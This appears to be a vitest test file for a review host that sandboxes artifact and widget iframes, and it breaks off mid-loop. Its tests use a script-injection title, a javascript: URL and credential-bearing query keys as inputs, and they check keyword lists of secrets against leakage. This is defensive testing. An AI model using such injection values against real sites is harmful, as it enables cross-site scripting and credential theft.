import { describe, expect, it, vi } from "vitest";

import {
  createSandboxedArtifactResponse,
  createTrustedReviewHostResponse,
  trustedReviewHostScript,
  trustedReviewHostStyles,
} from "../src/trusted-review-host";
import * as trustedReviewHostContracts from "../src/trusted-review-host";
import { compileRuntimeV1Widget } from "../src/self-owned/widget-runtime";

type FutureTrustedReviewHostContracts = {
  validateTrustedWidgetOperationRequest: (
    event: { source: unknown; origin: string; data: unknown },
    binding: {
      expectedSource: unknown;
      channelNonce: string;
      shipletId: string;
      revisionId: string;
    },
  ) =>
    | {
        ok: true;
        request: {
          requestId: string;
          operation: "feedback.create";
          payload: { comment: string };
        };
      }
    | { ok: false; reason: string };
  projectTrustedWidgetConfirmation: (request: {
    requestId: string;
    operation: "feedback.create";
    payload: { comment: string };
  }) => {
    requestId: string;
    operation: "feedback.create";
    heading: string;
    summary: string;
    confirmLabel: string;
  };
};

const futureTrustedReviewHostContracts =
  trustedReviewHostContracts as typeof trustedReviewHostContracts &
    FutureTrustedReviewHostContracts;

const baseInput = {
  shipletId: "shiplet_a",
  revisionId: "revision_a1",
  title: "Design review",
  artifactUrl: "https://artifact-a.shiplet.cc/__shiplet/artifact/index.html",
  widgetUrl: "https://artifact-a.shiplet.cc/__shiplet/widget/index.html",
  hostScriptUrl: "https://app.shiplet.cc/api/review/host.js",
  reviewApiUrl: "https://app.shiplet.cc/api/projects/shiplet_a/review-feedback",
};

type OperatedElement = Record<string, unknown> & {
  attributes: Map<string, string>;
  children: OperatedElement[];
  listeners: Map<string, Array<(event: unknown) => unknown>>;
  style: Record<string, string>;
  dispatch: (type: string, event?: unknown) => Promise<void>;
  getAttribute: (name: string) => string | null;
  querySelector: (selector: string) => OperatedElement | null;
  setAttribute: (name: string, value: string) => void;
};

function operatedElement(tagName: string): OperatedElement {
  const attributes = new Map<string, string>();
  const listeners = new Map<string, Array<(event: unknown) => unknown>>();
  const children: OperatedElement[] = [];
  const element: OperatedElement = {
    tagName: tagName.toUpperCase(),
    attributes,
    children,
    listeners,
    style: {},
    textContent: "",
    hidden: false,
    disabled: false,
    dataset: {},
    value: "",
    childElementCount: 0,
    querySelector: () => null,
    getAttribute(name: string) {
      return attributes.get(name) ?? null;
    },
    setAttribute(name: string, value: string) {
      attributes.set(name, String(value));
    },
    removeAttribute(name: string) {
      attributes.delete(name);
    },
    remove() {
      element.removed = true;
    },
    focus: vi.fn(),
    addEventListener(
      type: string,
      listener: (event: unknown) => unknown,
      options?: boolean | { once?: boolean },
    ) {
      const once = typeof options === "object" && options?.once === true;
      const registered = once
        ? async (event: unknown) => {
            listeners.set(
              type,
              (listeners.get(type) || []).filter(
                (candidate) => candidate !== registered,
              ),
            );
            await listener(event);
          }
        : listener;
      listeners.set(type, [...(listeners.get(type) || []), registered]);
    },
    append(...items: OperatedElement[]) {
      children.push(...items);
      element.childElementCount = children.length;
    },
    appendChild(item: OperatedElement) {
      children.push(item);
      element.childElementCount = children.length;
      return item;
    },
    replaceChildren(...items: OperatedElement[]) {
      children.splice(0, children.length, ...items);
      element.childElementCount = children.length;
    },
    async dispatch(type: string, event: unknown = {}) {
      for (const listener of listeners.get(type) || []) {
        await listener(event);
      }
    },
  };
  return element;
}

async function operateTrustedHostScript(options?: {
  connectArtifact?: boolean;
  connectWidget?: boolean;
  confirmationUrl?: string;
  dispatchInitialFrameLoads?: boolean;
  failTopLevelSubmission?: boolean;
  feedback?: unknown[];
  online?: boolean;
  presenceViewers?: unknown[];
  viewport?: { width: number; height: number };
}) {
  const pageAttributes = new Map([
    [
      "data-review-api-url",
      options?.presenceViewers
        ? "https://app.shiplet.cc/api/projects/shiplet_a/review-feedback"
        : "https://app.shiplet.cc/embed/review/feedback",
    ],
    ["data-review-page-url", "https://client.example/pricing/"],
    [
      "data-review-confirm-url",
      options?.confirmationUrl || "https://app.shiplet.cc/embed/review/confirm",
    ],
    ["data-shiplet-id", "shiplet_a"],
    ["data-revision-id", "revision_a1"],
  ]);
  const page = {
    getAttribute(name: string) {
      return pageAttributes.get(name) || null;
    },
  };
  const panel = operatedElement("section");
  const controls = operatedElement("div");
  const artifact = operatedElement("iframe");
  const widget = operatedElement("iframe");
  widget.setAttribute(
    "src",
    "https://artifact-a.shiplet.cc/__shiplet/widget/index.html",
  );
  const confirmation = operatedElement("section");
  const confirmationHeading = operatedElement("h3");
  const confirmationSummary = operatedElement("p");
  const confirmationFields = operatedElement("pre");
  const confirm = operatedElement("button");
  const cancel = operatedElement("button");
  confirmation.hidden = true;
  confirmation.querySelector = (selector: string) =>
    selector === "h3"
      ? confirmationHeading
      : selector === "p"
        ? confirmationSummary
        : selector === "[data-shiplet-widget-confirmation-fields]"
          ? confirmationFields
          : selector === "[data-shiplet-widget-confirm]"
            ? confirm
            : selector === "[data-shiplet-widget-cancel]"
              ? cancel
              : null;
  const widgetWindow = { postMessage: vi.fn() };
  const artifactWindow = { postMessage: vi.fn() };
  widget.contentWindow = widgetWindow;
  artifact.contentWindow = artifactWindow;
  const body = operatedElement("body");
  const createdElements: OperatedElement[] = [];
  const submittedForms: OperatedElement[] = [];
  let failTopLevelSubmission = options?.failTopLevelSubmission ?? false;
  const document = {
    body,
    documentElement: page,
    getElementById(id: string) {
      return id === "shiplet-kernel-review-panel" ? panel : null;
    },
    querySelector(selector: string) {
      return selector === "[data-shiplet-kernel-review-controls]"
        ? controls
        : selector === "[data-shiplet-artifact-frame]"
          ? artifact
          : selector === "[data-shiplet-widget-frame]"
            ? widget
            : selector === "[data-shiplet-widget-confirmation]"
              ? confirmation
              : null;
    },
    createElement(tagName: string) {
      const element = operatedElement(tagName);
      createdElements.push(element);
      if (tagName.toLowerCase() === "form") {
        const submitTopLevel = vi.fn(() => {
          if (failTopLevelSubmission) {
            throw new Error("Top-level confirmation was blocked");
          }
          submittedForms.push(element);
        });
        element.requestSubmit = submitTopLevel;
        element.submit = submitTopLevel;
      }
      return element;
    },
  };
  const windowListeners = new Map<string, Array<(event: unknown) => unknown>>();
  class FakeWebSocket {
    listeners = new Map<string, Array<(event: unknown) => unknown>>();
    sent: string[] = [];
    constructor(_url: string) {
      Promise.resolve().then(async () => {
        await this.dispatch("open", {});
        await this.dispatch("message", {
          data: JSON.stringify({
            type: "presence:update",
            viewers: options?.presenceViewers || [],
          }),
        });
      });
    }
    addEventListener(type: string, listener: (event: unknown) => unknown) {
      this.listeners.set(type, [...(this.listeners.get(type) || []), listener]);
    }
    send(message: string) {
      this.sent.push(message);
    }
    close() {}
    async dispatch(type: string, event: unknown) {
      for (const listener of this.listeners.get(type) || []) {
        await listener(event);
      }
    }
  }
  const open = vi.fn(() => ({ closed: false }));
  const window = {
    innerWidth: options?.viewport?.width ?? 900,
    innerHeight: options?.viewport?.height ?? 700,
    open,
    setTimeout: globalThis.setTimeout.bind(globalThis),
    clearTimeout: globalThis.clearTimeout.bind(globalThis),
    ...(options?.presenceViewers ? { WebSocket: FakeWebSocket } : {}),
    addEventListener(type: string, listener: (event: unknown) => unknown) {
      windowListeners.set(type, [
        ...(windowListeners.get(type) || []),
        listener,
      ]);
    },
    async dispatch(type: string, event: unknown) {
      for (const listener of windowListeners.get(type) || []) {
        await listener(event);
      }
    },
  };
  class FakePort {
    listeners = new Map<string, Array<(event: { data: unknown }) => unknown>>();
    messages: unknown[] = [];
    closed = false;
    addEventListener(
      type: string,
      listener: (event: { data: unknown }) => unknown,
    ) {
      this.listeners.set(type, [...(this.listeners.get(type) || []), listener]);
    }
    start() {}
    postMessage(message: unknown) {
      if (this.closed) return;
      this.messages.push(message);
    }
    close() {
      this.closed = true;
    }
    async dispatch(data: unknown) {
      if (this.closed) return;
      for (const listener of this.listeners.get("message") || []) {
        await listener({ data });
      }
    }
  }
  const channels: Array<{ port1: FakePort; port2: FakePort }> = [];
  class FakeMessageChannel {
    port1 = new FakePort();
    port2 = new FakePort();
    constructor() {
      channels.push(this);
    }
  }
  let uuidCounter = 0;
  const fakeCrypto = {
    randomUUID() {
      uuidCounter += 1;
      return `00000000-0000-4000-8000-${String(uuidCounter).padStart(12, "0")}`;
    },
  };
  const fetch = vi.fn(async () => ({
    ok: true,
    status: 200,
    json: async () => ({ feedback: options?.feedback ?? [] }),
  }));
  const navigator = { onLine: options?.online ?? true };
  const execute = new Function(
    "window",
    "document",
    "location",
    "fetch",
    "crypto",
    "MessageChannel",
    "TextEncoder",
    "navigator",
    trustedReviewHostScript(),
  );
  execute(
    window,
    document,
    { href: "https://app.shiplet.cc/embed/review/host" },
    fetch,
    fakeCrypto,
    FakeMessageChannel,
    TextEncoder,
    navigator,
  );
  await Promise.resolve();
  if (options?.dispatchInitialFrameLoads !== false) {
    await widget.dispatch("load");
  }
  const offer = widgetWindow.postMessage.mock.calls.at(-1)?.[0] as
    | Record<string, unknown>
    | undefined;
  if (offer && options?.connectWidget !== false) {
    await window.dispatch("message", {
      source: widgetWindow,
      origin: "null",
      data: {
        protocol: "shiplet.widget.channel.v1",
        type: "ready",
        channelNonce: offer.channelNonce,
        shipletId: offer.shipletId,
        revisionId: offer.revisionId,
      },
    });
  }
  if (options?.dispatchInitialFrameLoads !== false) {
    await artifact.dispatch("load");
  }
  const artifactOffer = artifactWindow.postMessage.mock.calls.at(-1)?.[0] as
    | Record<string, unknown>
    | undefined;
  if (artifactOffer && options?.connectArtifact !== false) {
    await window.dispatch("message", {
      source: artifactWindow,
      origin: "null",
      data: {
        protocol: "shiplet.artifact.channel.v1",
        type: "ready",
        channelNonce: artifactOffer.channelNonce,
        shipletId: artifactOffer.shipletId,
        revisionId: artifactOffer.revisionId,
      },
    });
  }
  for (let index = 0; index < 6; index += 1) await Promise.resolve();
  fetch.mockClear();
  const form = createdElements.find(
    (element) => element.className === "shiplet-review-form",
  );
  const comment = createdElements.find(
    (element) => element.id === "shiplet-review-comment",
  );
  const submit = createdElements.find(
    (element) => element.tagName === "BUTTON" && element.type === "submit",
  );
  const status = createdElements.find(
    (element) => element.className === "shiplet-review-status",
  );
  const launcher = createdElements.find(
    (element) => element.className === "shiplet-review-launcher",
  );
  const count = createdElements.find(
    (element) => element.className === "shiplet-review-count",
  );
  const list = createdElements.find(
    (element) => element.className === "shiplet-review-list",
  );
  const refresh = createdElements.find(
    (element) => element.getAttribute("data-shiplet-review-refresh") === "v1",
  );
  const close = createdElements.find(
    (element) => element.getAttribute("data-shiplet-review-close") === "v1",
  );
  return {
    artifact,
    artifactOffer,
    artifactWindow,
    body,
    channels,
    comment,
    count,
    createdElements,
    cancel,
    confirmation,
    confirmationHeading,
    confirmationSummary,
    confirmationFields,
    confirm,
    fetch,
    form,
    launcher,
    list,
    navigator,
    offer,
    open,
    panel,
    refresh,
    close,
    setTopLevelSubmissionFailure(value: boolean) {
      failTopLevelSubmission = value;
    },
    status,
    submit,
    submittedForms,
    widgetWindow,
    widget,
    window,
  };
}

function operatedFormFields(form: OperatedElement) {
  return Object.fromEntries(
    form.children
      .filter((child) => child.tagName === "INPUT")
      .map((child) => [String(child.name || ""), String(child.value || "")]),
  );
}

function expectSecureTopLevelConfirmationForm(
  form: OperatedElement,
  expected: {
    confirmationPath?: string;
    requestId?: string;
    comment: string;
    pageUrl: string;
  },
) {
  const action = new URL(String(form.action || ""));
  expect.soft(action.origin).toBe("https://app.shiplet.cc");
  expect
    .soft(action.pathname)
    .toBe(expected.confirmationPath || "/embed/review/confirm");
  expect.soft(action.search).toBe("");
  expect.soft(action.hash).toBe("");
  expect.soft(String(form.method).toUpperCase()).toBe("POST");
  expect.soft(form.target).toBe("_blank");
  expect.soft(String(form.rel)).toContain("noopener");
  expect.soft(String(form.rel)).not.toContain("noreferrer");
  const fields = operatedFormFields(form);
  expect
    .soft(Object.keys(fields).sort())
    .toEqual([
      "client_feedback_id",
      "comment",
      "operation",
      "page_url",
      "request_id",
      "revision_id",
      "shiplet_id",
    ]);
  expect.soft(fields.operation).toBe("feedback.create");
  expect.soft(fields.page_url).toBe(expected.pageUrl);
  expect.soft(fields.comment).toBe(expected.comment);
  expect.soft(fields.shiplet_id).toBe("shiplet_a");
  expect.soft(fields.revision_id).toBe("revision_a1");
  expect
    .soft(fields.client_feedback_id)
    .toMatch(/^(?=.{8,120}$)[A-Za-z0-9]+(?:-[A-Za-z0-9]+)+$/);
  expect.soft(fields.request_id).toMatch(/^[A-Za-z0-9][A-Za-z0-9._:-]{0,255}$/);
  if (expected.requestId) {
    expect.soft(fields.request_id).toBe(expected.requestId);
  }
  const serialized = JSON.stringify({ action: action.toString(), fields });
  for (const forbidden of [
    "authorization",
    "bearer",
    "cookie",
    "oauth",
    "receipt",
    "review_token",
    "session",
  ]) {
    expect.soft(serialized.toLowerCase()).not.toContain(forbidden);
  }
}

describe("trusted review host boundary", () => {
  // Given a trusted host around an opaque artifact, when review state loads or
  // changes, then the host—not the child—owns familiar, accessible controls.
  it("renders a sleeping launcher, contextual compact threads, and a progressively disclosed composer in the trusted document", async () => {
    const harness = await operateTrustedHostScript({
      feedback: [
        {
          id: "feedback_12",
          ticket_label: "REV-12",
          comment: "Tighten the hero copy.",
          status: "New",
          submitted_by_email: "reviewer@example.com",
          created_on: "2026-08-13T19:30:00.000Z",
          coordinates: { viewportX: 48, viewportY: 72 },
          replies: [
            {
              id: "reply_12",
              comment: "Adjusted in the latest pass.",
              author_email: "builder@example.com",
              created_on: "2026-08-13T19:45:00.000Z",
            },
          ],
        },
        {
          id: "feedback_13",
          ticket_label: "REV-13",
          comment: "Check the mobile spacing.",
          status: "Done",
          submitted_by_email: "owner@example.com",
          created_on: "2026-08-13T20:00:00.000Z",
          coordinates: { viewportX: 360, viewportY: 740 },
        },
      ],
    });

    expect.soft(harness.launcher?.textContent).toBe("Annotate");
    expect
      .soft(harness.launcher?.getAttribute("aria-controls"))
      .toBe("shiplet-annotation-composer");
    expect.soft(harness.launcher?.getAttribute("aria-expanded")).toBe("false");
    expect.soft(harness.launcher?.getAttribute("aria-keyshortcuts")).toBe("c");
    expect.soft(harness.panel.hidden).toBe(true);
    expect.soft(harness.count?.textContent).toBe("2");
    expect.soft(harness.count?.getAttribute("aria-label")).toBe("2 comments");
    expect.soft(harness.refresh?.textContent).toContain("Refresh");
    expect.soft(harness.list?.children).toHaveLength(2);
    expect
      .soft(harness.list?.children[0]?.getAttribute("aria-label"))
      .toContain("REV-12");
    expect
      .soft(harness.list?.children[0]?.getAttribute("aria-label"))
      .toContain("Tighten the hero copy.");

    const commentsLauncher = harness.createdElements.find(
      (element) => element.className === "shiplet-review-comments-launcher",
    );
    expect
      .soft(commentsLauncher?.getAttribute("aria-controls"))
      .toBe("shiplet-kernel-review-panel");
    await commentsLauncher?.dispatch("click", { isTrusted: true });
    expect.soft(harness.panel.hidden).toBe(false);
    expect.soft(commentsLauncher?.getAttribute("aria-expanded")).toBe("true");

    const context = harness.createdElements.find(
      (element) => element.className === "shiplet-review-context",
    );
    const contextSummary = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-context-summary") === "v1",
    );
    expect.soft(contextSummary?.textContent).toBe("/pricing/");
    expect.soft(contextSummary?.textContent).not.toContain("shiplet_a");
    expect.soft(contextSummary?.textContent).not.toContain("revision_a1");
    expect.soft(context?.textContent).toContain("shiplet_a");
    expect.soft(context?.textContent).toContain("revision_a1");
    expect.soft(context?.textContent).toContain("/pricing/");
    expect.soft(harness.form?.hidden).toBe(true);

    const compose = harness.createdElements.find(
      (element) => element.getAttribute("data-shiplet-review-compose") === "v1",
    );
    expect.soft(compose?.textContent).toBe("+");
    expect.soft(compose?.getAttribute("aria-label")).toBe("New comment");
    expect.soft(compose?.className).not.toContain("shiplet-review-primary");
    expect.soft(harness.form?.hidden).toBe(true);

    const firstAuthor = harness.createdElements.find(
      (element) => element.className === "shiplet-review-thread-author",
    );
    const firstTime = harness.createdElements.find(
      (element) => element.className === "shiplet-review-thread-time",
    );
    const replyAuthor = harness.createdElements.find(
      (element) => element.className === "shiplet-review-reply-author",
    );
    expect.soft(firstAuthor?.textContent).toContain("reviewer@example.com");
    expect.soft(firstTime?.textContent).toBeTruthy();
    expect.soft(replyAuthor?.textContent).toContain("builder@example.com");

    expect(
      harness.createdElements.some(
        (element) =>
          element.getAttribute("data-shiplet-review-previous") === "v1",
      ),
    ).toBe(true);
    const pins = harness.createdElements.filter(
      (element) => element.className === "shiplet-review-pin",
    );
    expect.soft(pins).toHaveLength(2);
    expect.soft(pins[0]?.style.left).toBe("64px");
    expect.soft(pins[0]?.style.top).toBe("56px");
    expect.soft(pins[0]?.getAttribute("style")).toBeNull();

    const firstSummary = harness.createdElements.find(
      (element) => element.className === "shiplet-review-thread-summary",
    );
    const firstPreview = harness.createdElements.find(
      (element) =>
        element.className === "shiplet-review-thread-summary-comment",
    );
    const firstBody = harness.createdElements.find(
      (element) => element.className === "shiplet-review-thread-comment",
    );
    const firstDetails = harness.createdElements.find(
      (element) => element.className === "shiplet-review-thread-details",
    );
    const firstActions = harness.createdElements.find(
      (element) => element.className === "shiplet-review-thread-meta",
    );
    const firstReplyForm = harness.createdElements.find(
      (element) => element.className === "shiplet-review-reply-form",
    );
    const firstReplyInput = firstReplyForm?.children.find(
      (element) => element.tagName === "INPUT",
    );
    const firstReplyButton = firstReplyForm?.children.find(
      (element) => element.tagName === "BUTTON",
    );
    await firstSummary?.dispatch("click", { isTrusted: true });
    expect.soft(firstPreview?.hidden).toBe(true);
    expect.soft(firstBody?.textContent).toBe("Tighten the hero copy.");
    expect
      .soft(harness.list?.children[0]?.getAttribute("data-active"))
      .toBe("true");
    expect.soft(pins[0]?.getAttribute("data-active")).toBe("true");
    expect.soft(pins[0]?.getAttribute("aria-current")).toBe("true");
    expect.soft(firstDetails?.children[0]).toBe(firstBody);
    expect.soft(firstDetails?.children[1]).toBe(firstActions);
    expect.soft(firstReplyForm?.hidden).toBe(false);
    expect.soft(firstReplyInput?.placeholder).toBe("Reply to this thread…");
    expect.soft(firstReplyButton?.textContent).toBe("Send");

    await firstSummary?.dispatch("click", { isTrusted: true });
    expect.soft(firstPreview?.hidden).toBe(false);
    expect
      .soft(harness.list?.children[0]?.getAttribute("data-active"))
      .toBe("false");
    expect.soft(pins[0]?.getAttribute("data-active")).toBe("false");
    expect.soft(pins[0]?.getAttribute("aria-current")).toBeNull();
    expect(
      harness.createdElements.some(
        (element) => element.getAttribute("data-shiplet-review-next") === "v1",
      ),
    ).toBe(true);
    expect(
      harness.createdElements.some(
        (element) =>
          element.getAttribute("data-shiplet-review-quick-status") === "Done" &&
          element.textContent === "Resolve",
      ),
    ).toBe(true);
    expect(
      harness.createdElements.some(
        (element) =>
          element.getAttribute("data-shiplet-review-reply-open") ===
          "feedback_12",
      ),
    ).toBe(false);
    expect(
      harness.createdElements.some(
        (element) =>
          element.getAttribute("aria-label") ===
            "More status options for REV-12" &&
          element.textContent === "Status",
      ),
    ).toBe(true);
    expect(
      harness.createdElements.some(
        (element) => element.textContent === "Update",
      ),
    ).toBe(false);

    const escape = {
      isTrusted: true,
      key: "Escape",
      target: harness.comment,
      preventDefault: vi.fn(),
      stopPropagation: vi.fn(),
    };
    await harness.window.dispatch("keydown", escape);
    expect.soft(escape.preventDefault).toHaveBeenCalled();
    expect.soft(harness.form?.hidden).toBe(true);
    expect.soft(harness.panel.hidden).toBe(true);

    await harness.close?.dispatch("click", { isTrusted: true });
    expect.soft(harness.panel.hidden).toBe(true);
    expect.soft(commentsLauncher?.getAttribute("aria-expanded")).toBe("false");
  });

  it("removes redundant chrome when a review has only one thread", async () => {
    const harness = await operateTrustedHostScript({
      feedback: [
        {
          id: "feedback_12",
          ticket_label: "REV-12",
          comment: "Tighten the hero copy.",
          status: "New",
          submitted_by_email: "reviewer@example.com",
          created_on: "2026-08-13T19:30:00.000Z",
          coordinates: { viewportX: 48, viewportY: 72 },
        },
      ],
    });

    const previous = harness.createdElements.find(
      (element) =>
        element.getAttribute("data-shiplet-review-previous") === "v1",
    );
    const next = harness.createdElements.find(
      (element) => element.getAttribute("data-shiplet-review-next") === "v1",
    );
    expect.soft(previous?.hidden).toBe(true);
    expect.soft(next?.hidden).toBe(true);
    expect.soft(harness.status?.hidden).toBe(true);
  });

  it("announces loading, empty, denied, offline, and retryable error states without trusting child content", async () => {
    const harness = await operateTrustedHostScript();
    expect.soft(harness.status?.textContent).toMatch(/no comments yet/i);
    expect.soft(harness.list?.getAttribute("aria-busy")).toBe("false");

    harness.fetch.mockImplementationOnce(async () => ({
      ok: false,
      status: 403,
      json: async () => ({ feedback: [] }),
    }));
    await harness.refresh?.dispatch("click", { isTrusted: true });
    expect.soft(harness.status?.textContent).toMatch(/access.*denied/i);
    expect.soft(harness.status?.getAttribute("role")).toBe("alert");

    harness.fetch.mockRejectedValueOnce(new TypeError("network unavailable"));
    harness.navigator.onLine = false;
    await harness.refresh?.dispatch("click", { isTrusted: true });
    expect.soft(harness.status?.textContent).toMatch(/offline/i);

    harness.fetch.mockRejectedValueOnce(new Error("unexpected"));
    harness.navigator.onLine = true;
    await harness.refresh?.dispatch("click", { isTrusted: true });
    expect.soft(harness.status?.textContent).toMatch(/could not load/i);
    expect.soft(harness.refresh?.disabled).toBe(false);
  });

  it("keeps a loaded thread visually primary when a later background refresh fails", async () => {
    const harness = await operateTrustedHostScript({
      feedback: [
        {
          id: "feedback_stale_1",
          ticket_label: "REV-STALE",
          comment: "Keep this loaded comment readable.",
          status: "New",
          submitted_by_email: "reviewer@example.com",
          created_on: "2026-08-13T19:30:00.000Z",
        },
      ],
    });

    harness.fetch.mockRejectedValueOnce(
      new Error("unexpected refresh failure"),
    );
    await harness.refresh?.dispatch("click", { isTrusted: true });

    expect.soft(harness.list?.children).toHaveLength(1);
    expect.soft(harness.status?.textContent).toBe("1 comment.");
    expect.soft(harness.status?.hidden).toBe(true);
  });

  it("renders live reviewers with the same signal-flag presets as their profiles", async () => {
    const harness = await operateTrustedHostScript({
      presenceViewers: [
        {
          id: "user_alfa",
          kind: "user",
          name: "Alfa Reviewer",
          avatarPreset: "aurora-grid",
        },
        {
          id: "user_foxtrot",
          kind: "user",
          name: "Foxtrot Reviewer",
          avatarPreset: "violet-signal",
        },
      ],
    });

    const avatars = harness.createdElements.filter(
      (element) => element.className === "shiplet-review-presence-avatar",
    );
    expect(avatars).toHaveLength(2);
    expect(avatars[0]?.textContent).toBe("");
    expect(avatars[0]?.style.backgroundImage).toContain(
      "/brand/avatars/shiplet-avatar-presets-v9.png",
    );
    expect(avatars[0]?.style.backgroundPosition).toBe("0% 0%");
    expect(avatars[1]?.style.backgroundImage).toBe(
      avatars[0]?.style.backgroundImage,
    );
    expect(avatars[1]?.style.backgroundPosition).toBe("33.33333333333333% 50%");
    expect(avatars[1]?.style.backgroundSize).toBe("400% 300%");
  });

  it("places artifact and custom widget code in distinct opaque-origin sandboxed frames", async () => {
    const response = createTrustedReviewHostResponse(baseInput);
    const html = await response.text();

    expect(response.status).toBe(200);
    expect(html).toContain('data-shiplet-trusted-review-host="v1"');
    expect(html).toContain(`src="${baseInput.artifactUrl}"`);
    expect(html).toContain(`src="${baseInput.widgetUrl}"`);
    const sandboxes = Array.from(
      html.matchAll(/<iframe[^>]+sandbox="([^"]*)"/g),
      (match) => match[1].split(/\s+/).filter(Boolean),
    );
    expect(sandboxes).toHaveLength(2);
    const [artifactSandbox, widgetSandbox] = sandboxes;
    for (const sandbox of [artifactSandbox, widgetSandbox]) {
      expect(sandbox).toContain("allow-scripts");
      expect(sandbox).not.toContain("allow-same-origin");
      expect(sandbox).not.toContain("allow-modals");
      expect(sandbox).not.toContain("allow-downloads");
      expect(sandbox).not.toContain("allow-top-navigation");
      expect(sandbox).not.toContain("allow-popups-to-escape-sandbox");
    }
    expect(artifactSandbox).not.toContain("allow-popups");
    expect(widgetSandbox).not.toContain("allow-popups");
    expect(html.match(/referrerpolicy="no-referrer"/g)).toHaveLength(2);
  });

  it("allows downloads only when a trusted generated artifact viewer explicitly opts in", async () => {
    const html = await createTrustedReviewHostResponse({
      ...baseInput,
      allowArtifactDownloads: true,
    }).text();
    const artifactSandbox = html.match(
      /<iframe[^>]+data-shiplet-artifact-frame="v1"[^>]+sandbox="([^"]*)"/,
    )?.[1];
    const widgetSandbox = html.match(
      /<iframe[^>]+data-shiplet-widget-frame="v1"[^>]+sandbox="([^"]*)"/,
    )?.[1];

    expect(artifactSandbox).toContain("allow-downloads");
    expect(widgetSandbox).not.toContain("allow-downloads");
  });

  it("never serializes review, OAuth, claim, session, or capability credentials into arbitrary code", async () => {
    const html = await createTrustedReviewHostResponse(baseInput).text();

    expect(html).not.toContain("__SHIPLET_REVIEW__");
    expect(html).not.toContain("reviewToken");
    expect(html).not.toContain("presenceToken");
    expect(html).not.toContain("Authorization");
    expect(html).not.toContain("Bearer ");
    expect(html).not.toContain("oauth");
    expect(html).not.toContain("claim");
    expect(html).not.toContain("session=");
    expect(html).not.toMatch(/shiplet_review_cap_v1\./);
  });

  it.each([
    "shiplet_preview_token",
    "review_token",
    "access_token",
    "authorization_code",
    "claim_url",
  ])("rejects a frame URL containing the sensitive query key %s", (key) => {
    expect(() =>
      createTrustedReviewHostResponse({
        ...baseInput,
        artifactUrl: `${baseInput.artifactUrl}?${key}=must-not-enter-frame`,
      }),
    ).toThrowError(/credential-bearing frame URL/i);
  });

  it("emits restrictive host security headers and only declared frame origins", () => {
    const response = createTrustedReviewHostResponse(baseInput);
    const csp = response.headers.get("content-security-policy") || "";

    expect(csp).toContain("default-src 'none'");
    expect(csp).toMatch(/script-src 'nonce-[A-Za-z0-9+/_=-]{20,}'/);
    expect(csp).toContain("script-src-attr 'none'");
    expect(csp).toContain("connect-src https://app.shiplet.cc");
    expect(csp).toContain("frame-src https://artifact-a.shiplet.cc");
    expect(csp).toContain("base-uri 'none'");
    expect(
      csp.split("; ").find((directive) => directive.startsWith("form-action ")),
    ).toBe("form-action https://app.shiplet.cc");
    expect(csp).toContain("frame-ancestors 'self'");
    expect(response.headers.get("referrer-policy")).toBe("strict-origin");
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
    expect(response.headers.get("permissions-policy")).toContain("camera=()");
    expect(response.headers.get("cache-control")).toBe(
      "private, no-store, no-transform",
    );
  });

  it("binds the exact trusted review-host script to a fresh route nonce", async () => {
    const firstResponse = createTrustedReviewHostResponse(baseInput);
    const firstHtml = await firstResponse.text();
    const firstCsp = firstResponse.headers.get("content-security-policy") || "";
    const firstNonce =
      firstCsp.match(/script-src[^;]*'nonce-([^']+)'/)?.[1] || "";
    const firstScriptPolicy =
      firstCsp
        .split(";")
        .map((directive) => directive.trim())
        .find((directive) => directive.startsWith("script-src ")) || "";
    const firstScript =
      firstHtml.match(
        /<script\b[^>]*src="[^"]*\/api\/review\/host\.js"[^>]*>/i,
      )?.[0] || "";

    const secondResponse = createTrustedReviewHostResponse(baseInput);
    const secondCsp =
      secondResponse.headers.get("content-security-policy") || "";
    const secondNonce =
      secondCsp.match(/script-src[^;]*'nonce-([^']+)'/)?.[1] || "";

    expect(firstNonce).toMatch(/^[A-Za-z0-9+/_=-]{20,}$/);
    expect(firstScript).toContain(`nonce="${firstNonce}"`);
    expect(firstScriptPolicy).toBe(`script-src 'nonce-${firstNonce}'`);
    expect(firstCsp).toContain("script-src-attr 'none'");
    expect(secondNonce).toMatch(/^[A-Za-z0-9+/_=-]{20,}$/);
    expect(secondNonce).not.toBe(firstNonce);
  });

  it("escapes package-controlled labels and rejects unsupported URL schemes", async () => {
    const html = await createTrustedReviewHostResponse({
      ...baseInput,
      title: `</title><script>globalThis.compromised=true</script>`,
    }).text();
    expect(html).not.toContain("<script>globalThis.compromised=true</script>");
    expect(html).toContain("&lt;/title&gt;");
    expect(() =>
      createTrustedReviewHostResponse({
        ...baseInput,
        widgetUrl: "javascript:globalThis.compromised=true",
      }),
    ).toThrowError(/https frame URL/i);
  });

  it("keeps the accessible trusted kernel panel present alongside a custom widget", async () => {
    const html = await createTrustedReviewHostResponse(baseInput).text();
    expect(html).toContain('id="shiplet-kernel-review-panel"');
    expect(html).toContain('aria-label="Review Design review"');
    expect(html).toContain('data-shiplet-widget-frame="v1"');
  });

  it("redacts credential-shaped review-page query material before rendering trusted host state", async () => {
    const nested = new URL("https://client.example/account/reset");
    nested.searchParams.set("tab", "profile");
    nested.searchParams.set("reset_password_token", "private-nested-reset");
    nested.hash = "private-nested-fragment";
    const reviewPage = new URL("https://client.example/reset/");
    reviewPage.searchParams.set("campaign", "fall");
    reviewPage.searchParams.set("page", "2");
    reviewPage.searchParams.set("reset_password_token", "private");
    reviewPage.searchParams.set("X-Amz-Credential", "private");
    reviewPage.searchParams.set("X-Amz-Signature", "private");
    reviewPage.searchParams.set("sig", "private");
    reviewPage.searchParams.set("state", "private");
    reviewPage.searchParams.set("continue", nested.toString());
    reviewPage.hash = "private-fragment";
    let response: Response | undefined;
    let thrown: unknown;
    try {
      response = createTrustedReviewHostResponse({
        ...baseInput,
        reviewPageUrl: reviewPage.toString(),
      });
    } catch (error) {
      thrown = error;
    }
    expect.soft(thrown).toBeUndefined();
    if (!response) return;
    const html = await response.text();
    const serializedPageUrl =
      html.match(/data-review-page-url="([^"]+)"/)?.[1] || "";
    const pageUrl = new URL(serializedPageUrl.replace(/&amp;/g, "&"));
    expect(pageUrl.searchParams.get("campaign")).toBe("fall");
    expect(pageUrl.searchParams.get("page")).toBe("2");
    const nestedPage = new URL(pageUrl.searchParams.get("continue") || "");
    expect(nestedPage.searchParams.get("tab")).toBe("profile");
    expect(nestedPage.searchParams.get("reset_password_token")).toBeNull();
    expect(nestedPage.hash).toBe("");
    for (const forbidden of [
      "reset_password_token",
      "X-Amz-Credential",
      "X-Amz-Signature",
      "sig=",
      "state=",
      "private-fragment",
      "private-nested-reset",
      "private-nested-fragment",
    ]) {
